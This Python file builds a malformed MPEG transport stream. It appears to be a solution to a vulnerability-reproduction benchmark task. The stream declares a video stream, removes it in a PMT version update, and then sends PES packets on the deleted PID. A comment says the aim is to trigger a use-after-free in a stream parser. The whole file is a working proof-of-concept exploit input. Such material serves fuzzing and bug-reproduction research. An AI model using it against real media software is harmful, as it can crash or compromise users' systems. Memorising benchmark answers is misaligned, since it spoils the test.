import struct
import tarfile

def crc32_mpeg2(data: bytes) -> int:
    crc = 0xFFFFFFFF
    poly = 0x04C11DB7
    for b in data:
        crc ^= (b << 24) & 0xFFFFFFFF
        for _ in range(8):
            if crc & 0x80000000:
                crc = ((crc << 1) ^ poly) & 0xFFFFFFFF
            else:
                crc = (crc << 1) & 0xFFFFFFFF
    return crc & 0xFFFFFFFF

def build_pat_section(ts_id: int, program_number: int, pmt_pid: int, version: int = 0) -> bytes:
    section = bytearray()
    table_id = 0x00
    # Placeholder for section_length, computed later
    section.append(table_id)
    # section_syntax_indicator(1)=1, '0'(1)=0, reserved(2)=3, section_length(12)=to set
    # Use 0xB0 as base (1011 0000)
    section.extend(b'\x00\x00')  # will fill later with B0 | (len>>8), len & 0xFF
    section.extend(struct.pack(">H", ts_id))
    # reserved(2)=3, version(5), current_next(1)=1
    ver_cn = 0xC0 | ((version & 0x1F) << 1) | 0x01
    section.append(ver_cn)
    section.append(0x00)  # section_number
    section.append(0x00)  # last_section_number
    # program loop
    section.extend(struct.pack(">H", program_number))
    pid_field = 0xE000 | (pmt_pid & 0x1FFF)
    section.extend(struct.pack(">H", pid_field))
    # compute section_length
    sec_len = len(section) - 3 + 4  # bytes after 'section_length' field up to CRC inclusive
    section[1] = 0xB0 | ((sec_len >> 8) & 0x0F)
    section[2] = sec_len & 0xFF
    # CRC
    crc = crc32_mpeg2(section)
    section.extend(struct.pack(">I", crc))
    return bytes(section)

def build_pmt_section(program_number: int, pcr_pid: int, es_list, version: int) -> bytes:
    # es_list: list of tuples (stream_type, elementary_pid, es_info_bytes)
    section = bytearray()
    table_id = 0x02
    section.append(table_id)
    section.extend(b'\x00\x00')  # placeholder for section_length
    section.extend(struct.pack(">H", program_number))
    ver_cn = 0xC0 | ((version & 0x1F) << 1) | 0x01
    section.append(ver_cn)
    section.append(0x00)  # section_number
    section.append(0x00)  # last_section_number
    # PCR PID
    pcr_field = 0xE000 | (pcr_pid & 0x1FFF)
    section.extend(struct.pack(">H", pcr_field))
    # program_info_length = 0 (with reserved bits)
    section.extend(struct.pack(">H", 0xF000 | 0))
    # ES loop
    for stype, e_pid, es_info in es_list:
        section.append(stype & 0xFF)
        ep_field = 0xE000 | (e_pid & 0x1FFF)
        section.extend(struct.pack(">H", ep_field))
        es_len = len(es_info)
        section.extend(struct.pack(">H", 0xF000 | (es_len & 0x0FFF)))
        if es_len:
            section.extend(es_info)
    # compute section_length
    sec_len = len(section) - 3 + 4
    section[1] = 0xB0 | ((sec_len >> 8) & 0x0F)
    section[2] = sec_len & 0xFF
    # CRC
    crc = crc32_mpeg2(section)
    section.extend(struct.pack(">I", crc))
    return bytes(section)

def build_pes_packet(stream_id: int, payload: bytes, pts: int = None) -> bytes:
    # Build a PES packet with optional PTS
    pes = bytearray()
    pes.extend(b'\x00\x00\x01')
    pes.append(stream_id & 0xFF)
    # We'll compute PES_packet_length if PTS provided; for video stream it's allowed to be 0
    if pts is None:
        pes.extend(b'\x00\x00')  # length 0 (unspecified)
        pes.append(0x80)  # '10' + flags zero
        pes.append(0x00)  # flags
        pes.append(0x00)  # header data length
    else:
        # Include only PTS
        flags1 = 0x80  # '10'
        flags2 = 0x80  # PTS_DTS_flags = '10'
        header_data = bytearray()
        # Encode PTS (33 bits) as per PES
        # '0010' | PTS[32..30], then etc
        val = pts & ((1 << 33) - 1)
        b0 = ((0x2 << 4) | (((val >> 30) & 0x07) << 1) | 1) & 0xFF
        b1 = ((val >> 22) & 0xFF)
        b2 = ((((val >> 15) & 0x7F) << 1) | 1) & 0xFF
        b3 = ((val >> 7) & 0xFF)
        b4 = ((((val >> 0) & 0x7F) << 1) | 1) & 0xFF
        header_data.extend(bytes([b0, b1, b2, b3, b4]))
        pes_header_data_len = len(header_data)
        total_len = 3 + 1 + 2 + 2 + 1 + 1 + 1 + pes_header_data_len + len(payload)  # up to payload
        # If header length > 0xFFFF, clamp (won't happen here)
        pes.extend(struct.pack(">H", (2 + 1 + 1 + 1 + pes_header_data_len + len(payload)) & 0xFFFF))
        pes.append(flags1)
        pes.append(flags2)
        pes.append(pes_header_data_len & 0xFF)
        pes.extend(header_data)
    pes.extend(payload)
    return bytes(pes)

def build_ts_packet(pid: int, payload: bytes, pusi: bool, cc: int, adaptation: bytes = None, is_psi: bool = False) -> bytes:
    # Build a single 188-byte TS packet with optional adaptation field bytes (excluding the adaptation_length field)
    header = bytearray(4)
    header[0] = 0x47
    header[1] = ((1 if pusi else 0) << 6) | ((pid >> 8) & 0x1F)
    header[2] = pid & 0xFF
    if adaptation is not None and len(adaptation) > 0:
        afc = 0x30  # adaptation + payload
    else:
        afc = 0x10  # payload only
    header[3] = afc | (cc & 0x0F)

    packet = bytearray()
    packet.extend(header)

    if adaptation is not None and len(adaptation) > 0:
        # Include adaptation_field_length and adaptation bytes
        # Ensure adaptation bytes length <= 183 (since header 4 + 1 len + adaptation <= 188)
        ad_len = len(adaptation)
        if ad_len > 183:
            ad_len = 183
            adaptation = adaptation[:ad_len]
        packet.append(ad_len & 0xFF)
        packet.extend(adaptation)
    elif (header[3] & 0x30) == 0x20:
        # adaptation only with zero length if no payload - not used here
        packet.append(0)

    # Payload
    payload_bytes = bytearray()
    if is_psi and pusi:
        # For PSI, pointer_field must be present in the payload
        payload_bytes.append(0x00)  # pointer_field = 0
        payload_bytes.extend(payload)
    else:
        payload_bytes.extend(payload)

    # Compute remaining capacity for payload
    remaining = 188 - len(packet)
    # Keep payload within remaining
    if len(payload_bytes) > remaining:
        payload_bytes = payload_bytes[:remaining]
    packet.extend(payload_bytes)
    # Stuff with 0xFF to fill to 188 bytes
    if len(packet) < 188:
        packet.extend(b'\xFF' * (188 - len(packet)))
    return bytes(packet[:188])

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Constants
        PMT_PID = 0x0064  # 100
        ES_PID = 0x00C8   # 200
        PROGRAM_NUMBER = 1
        TS_ID = 1

        # Build PAT
        pat = build_pat_section(TS_ID, PROGRAM_NUMBER, PMT_PID, version=0)

        # Build PMT v0 with one ES (H.264)
        pmt_v0 = build_pmt_section(PROGRAM_NUMBER, pcr_pid=ES_PID, es_list=[(0x1B, ES_PID, b'')], version=0)

        # Build PES before PMT update
        pes_payload1 = b'\x00' * 32
        pes1 = build_pes_packet(0xE0, pes_payload1, pts=0x1FFFFFFF)

        # Build PMT v1 removing ES (no ES entries)
        pmt_v1 = build_pmt_section(PROGRAM_NUMBER, pcr_pid=ES_PID, es_list=[], version=1)

        # Build PES after deletion - attempt to trigger UAF
        pes_payload2 = b'\x11' * 64
        pes2 = build_pes_packet(0xE0, pes_payload2, pts=0x1FFFFFF0)

        # Another PES for more trigger opportunity
        pes_payload3 = b'\x22' * 64
        pes3 = build_pes_packet(0xE0, pes_payload3, pts=0x1FFFFFE0)

        # Build TS packets
        packets = []
        cc_map = {}

        def next_cc(pid):
            cc = cc_map.get(pid, -1) + 1
            cc_map[pid] = cc & 0x0F
            return cc_map[pid]

        # 1: PAT
        packets.append(build_ts_packet(0x0000, pat, pusi=True, cc=next_cc(0x0000), adaptation=None, is_psi=True))
        # 2: PMT v0
        packets.append(build_ts_packet(PMT_PID, pmt_v0, pusi=True, cc=next_cc(PMT_PID), adaptation=None, is_psi=True))
        # 3: PES before update
        packets.append(build_ts_packet(ES_PID, pes1, pusi=True, cc=next_cc(ES_PID), adaptation=None, is_psi=False))
        # 4: PMT v1 (remove ES)
        packets.append(build_ts_packet(PMT_PID, pmt_v1, pusi=True, cc=next_cc(PMT_PID), adaptation=None, is_psi=True))
        # 5: PES after deletion
        packets.append(build_ts_packet(ES_PID, pes2, pusi=True, cc=next_cc(ES_PID), adaptation=None, is_psi=False))
        # 6: Another PES after deletion
        packets.append(build_ts_packet(ES_PID, pes3, pusi=True, cc=next_cc(ES_PID), adaptation=None, is_psi=False))

        data = b''.join(packets)
        # Ensure length is exactly 1128 bytes (6 TS packets)
        if len(data) > 1128:
            data = data[:1128]
        elif len(data) < 1128:
            data += b'\xFF' * (1128 - len(data))
        return data
